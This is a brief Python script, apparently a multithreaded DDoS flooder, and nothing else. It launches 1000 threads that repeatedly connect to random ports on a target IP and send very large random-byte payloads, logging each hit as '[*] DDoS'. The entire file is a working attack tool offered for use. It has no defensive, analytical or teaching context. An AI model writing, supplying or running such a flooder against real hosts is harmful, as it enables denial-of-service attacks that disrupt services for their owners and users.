import socket
import random
import threading
import time

target_ip = "0.0.0.0"
target_ports = [i for i in range(1, 65536)]

def ddos():
    while True:
        try:
            port = random.choice(target_ports)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, port))
            payload = random._urandom(random.randint(32768, 65536)) * random.randint(500, 1000)
            sock.sendto(payload, (target_ip, port))
            print("[*] DDoS ", target_ip, ":", port)
            time.sleep(random.uniform(0.0001, 0.001))
        except socket.error:
            print("[!] Error")

for i in range(1000):
    t = threading.Thread(target=ddos)
    t.start()